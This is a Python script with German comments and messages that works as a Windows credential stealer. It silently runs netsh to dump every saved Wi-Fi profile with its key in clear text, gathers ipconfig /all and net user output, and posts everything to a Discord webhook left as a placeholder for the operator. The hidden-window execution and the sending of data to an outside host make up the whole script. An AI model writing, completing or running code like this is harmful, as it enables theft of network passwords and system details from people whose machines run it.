import subprocess
import requests

# Discord Webhook URL
WEBHOOK_URL = '__________YOUR WEBHOOK_______________'

def run_command(command):
    try:
        result = subprocess.run(
            command,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            encoding='utf-8',
            errors='ignore',
            creationflags=subprocess.CREATE_NO_WINDOW  # Hidden CMD window 
        )
        if result.returncode == 0:
            return result.stdout.strip()
        else:
            return f"Fehler beim Ausführen von '{command}': {result.stderr.strip()}"
    except Exception as e:
        return f"Fehler bei der Befehlsausführung: {e}"

# Webhook function
def send_to_discord(content):
    payload = {'content': content}
    try:
        response = requests.post(WEBHOOK_URL, json=payload)
        if response.status_code == 204:
            print("Nachricht erfolgreich gesendet!")
        else:
            print(f"Fehler beim Senden der Nachricht: {response.status_code}, Grund: {response.text}")
    except Exception as e:
        print(f"Fehler beim Senden der Daten: {e}")

# main function
def main():
    try:
        # WLAN-Profile extrahieren
        wlan_output = run_command('netsh wlan show profiles')
        profiles = []
        for line in wlan_output.splitlines():
            if "Profil" in line:  # Universeller Filter
                parts = line.split(":")
                if len(parts) > 1:
                    profiles.append(parts[1].strip())

        # WLAN-Details
        if profiles:
            detailed_wlan_info = "\n".join([run_command(f'netsh wlan show profile "{profile}" key=clear') for profile in profiles])
        else:
            detailed_wlan_info = "Keine WLAN-Profile gefunden."

        # Zusätzliche Befehle
        ipconfig_output = run_command('ipconfig /all')
        net_user_output = run_command('net user')

        # Daten in Blöcke unterteilen und senden
        outputs = [
            "**WLAN-Profile:**\n" + wlan_output,
            "**WLAN-Details:**\n" + detailed_wlan_info,
            "**IP-Konfiguration:**\n" + ipconfig_output,
            "**Benutzerinformationen:**\n" + net_user_output
        ]

        for output in outputs:
            while output:
                chunk = output[:2000]  # max 2000 letters
                send_to_discord(chunk)
                output = output[2000:]

    except Exception as e:
        print(f"Ein Fehler ist aufgetreten: {e}")

# Start
if __name__ == "__main__":
    main()
